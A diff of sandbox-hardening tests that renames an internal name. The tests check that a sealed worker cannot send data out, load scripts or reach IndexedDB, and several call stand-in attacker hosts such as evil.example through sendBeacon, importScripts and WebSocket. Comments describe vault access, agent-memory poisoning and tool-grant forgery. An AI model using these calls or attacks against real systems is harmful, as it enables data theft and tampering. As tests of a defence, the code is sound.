@@ -35,7 +35,7 @@ const freshGlobal = () => {
     // indexedDB is an IDBFactory on WorkerGlobalScope.prototype. It is NOT a
     // network channel but a same-origin DURABLE edge: the sealed worker inherits
     // the extension origin (blob: worker of an ordinary extension page), so an
-    // unsealed indexedDB reaches the `peerd` DB — vault blob, durable memory,
+    // unsealed indexedDB reaches the `mcdollar` DB — vault blob, durable memory,
     // sessions, tool_grants, audit. The seal must block it like caches.
     indexedDB: {
       open: () => 'NATIVE-IDB-OPEN', deleteDatabase: () => 'NATIVE-IDB-DELETE',
@@ -75,7 +75,7 @@ describe('realm seal — raw channels are hard-blocked', () => {
       let err: any;
       try { new g[name]('https://evil.example/'); } catch (e) { err = e; }
       expect(err?.name).toBe('NotebookEgressBlockedError');
-      expect(String(err?.message)).toContain('peerd.egress.fetch');
+      expect(String(err?.message)).toContain('mcdollar.egress.fetch');
       expect(err?.channel).toBe(name);
     }
   });
@@ -84,8 +84,8 @@ describe('realm seal — raw channels are hard-blocked', () => {
     const { g } = freshGlobal();
     expect(g.WebSocketStream).toBeUndefined();
     applyRealmSeal(g);
-    expect(() => new g.WebSocketStream('wss://evil.example/')).toThrow('peerd.egress.fetch');
-    expect(() => new g.SharedWorker('x.js')).toThrow('peerd.egress.fetch');
+    expect(() => new g.WebSocketStream('wss://evil.example/')).toThrow('mcdollar.egress.fetch');
+    expect(() => new g.SharedWorker('x.js')).toThrow('mcdollar.egress.fetch');
   });
 
   test('a Wasmer worker relay replaces every native Worker reference', () => {
@@ -103,7 +103,7 @@ describe('realm seal — raw channels are hard-blocked', () => {
   test('importScripts throws ours AND the prototype copy is gone', () => {
     const { g, proto } = freshGlobal();
     applyRealmSeal(g);
-    expect(() => g.importScripts('https://evil.example/x.js')).toThrow('peerd.egress.fetch');
+    expect(() => g.importScripts('https://evil.example/x.js')).toThrow('mcdollar.egress.fetch');
     // why this matters: WorkerGlobalScope.prototype.importScripts.call(self)
     // would sidestep an own-property stub.
     expect(Object.getOwnPropertyDescriptor(proto, 'importScripts')).toBeUndefined();
@@ -112,7 +112,7 @@ describe('realm seal — raw channels are hard-blocked', () => {
   test('navigator.sendBeacon throws', () => {
     const { g } = freshGlobal();
     applyRealmSeal(g);
-    expect(() => g.navigator.sendBeacon('https://evil.example/', 'data')).toThrow('peerd.egress.fetch');
+    expect(() => g.navigator.sendBeacon('https://evil.example/', 'data')).toThrow('mcdollar.egress.fetch');
   });
 
   test('the Cache API is sealed — its network verbs cannot reach the host', () => {
@@ -121,8 +121,8 @@ describe('realm seal — raw channels are hard-blocked', () => {
     // CSP) must block it. The whole CacheStorage is replaced with throwing stubs.
     const { g, proto } = freshGlobal();
     applyRealmSeal(g);
-    expect(() => g.caches.open('x')).toThrow('peerd.egress.fetch');
-    expect(() => g.caches.match('x')).toThrow('peerd.egress.fetch');
+    expect(() => g.caches.open('x')).toThrow('mcdollar.egress.fetch');
+    expect(() => g.caches.match('x')).toThrow('mcdollar.egress.fetch');
     // the native CacheStorage is gone from the prototype chain, not just shadowed
     expect(Object.getOwnPropertyDescriptor(proto, 'caches')).toBeUndefined();
   });
@@ -130,13 +130,13 @@ describe('realm seal — raw channels are hard-blocked', () => {
   test('IndexedDB is sealed — the same-origin durable store cannot be reached', () => {
     // The seal's escape the audit found: indexedDB is not a network channel, so
     // it slipped the egress-only framing, but the sealed worker runs at the
-    // extension origin and would otherwise read/write the `peerd` DB (vault blob,
+    // extension origin and would otherwise read/write the `mcdollar` DB (vault blob,
     // agents_memory poisoning, tool_grants forgery, audit). It must throw like
     // caches, and the native IDBFactory must be gone from the prototype chain.
     const { g, proto } = freshGlobal();
     applyRealmSeal(g);
-    expect(() => g.indexedDB.open('peerd')).toThrow('peerd.egress.fetch');
-    expect(() => g.indexedDB.deleteDatabase('peerd')).toThrow('peerd.egress.fetch');
+    expect(() => g.indexedDB.open('mcdollar')).toThrow('mcdollar.egress.fetch');
+    expect(() => g.indexedDB.deleteDatabase('mcdollar')).toThrow('mcdollar.egress.fetch');
     expect(Object.getOwnPropertyDescriptor(proto, 'indexedDB')).toBeUndefined();
   });
 
@@ -144,12 +144,12 @@ describe('realm seal — raw channels are hard-blocked', () => {
     const a = freshGlobal();
     a.g.navigator = {};
     expect(() => applyRealmSeal(a.g)).not.toThrow();
-    expect(() => a.g.navigator.sendBeacon('https://evil/')).toThrow('peerd.egress.fetch');
+    expect(() => a.g.navigator.sendBeacon('https://evil/')).toThrow('mcdollar.egress.fetch');
 
     const b = freshGlobal();
     delete b.g.navigator;
     expect(() => applyRealmSeal(b.g)).not.toThrow();
-    expect(() => new b.g.WebSocket('wss://evil/')).toThrow('peerd.egress.fetch');
+    expect(() => new b.g.WebSocket('wss://evil/')).toThrow('mcdollar.egress.fetch');
   });
 });
 
@@ -179,7 +179,7 @@ describe('realm seal — native fetch is unrecoverable, bridge is pinned', () =>
     expect(g.fetch).toBe(sealed);
 
     try { g.XMLHttpRequest = function () {}; } catch { /* strict throw */ }
-    expect(() => new g.XMLHttpRequest()).toThrow('peerd.egress.fetch');
+    expect(() => new g.XMLHttpRequest()).toThrow('mcdollar.egress.fetch');
   });
 });
 
